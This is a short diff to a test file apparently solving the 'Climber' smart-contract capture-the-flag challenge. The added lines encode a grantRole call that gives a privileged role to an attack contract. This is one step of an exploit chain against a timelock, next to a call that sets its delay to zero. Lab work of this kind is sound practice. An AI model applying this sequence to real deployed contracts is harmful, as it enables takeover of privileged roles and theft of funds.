@@ -95,6 +95,13 @@ describe("[Challenge] Climber", function () {
     let iface1 = new ethers.utils.Interface(abi1);
     let data1 = iface1.encodeFunctionData("updateDelay", [0]);
     dataElements.push(data1);
+    let abi2 = [`function grantRole(bytes32 role, address account)`];
+    let iface2 = new ethers.utils.Interface(abi2);
+    let data2 = iface2.encodeFunctionData("grantRole", [
+      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
+      climberAttack.address,
+    ]);
+    dataElements.push(data2);
   });
 
   after(async function () {
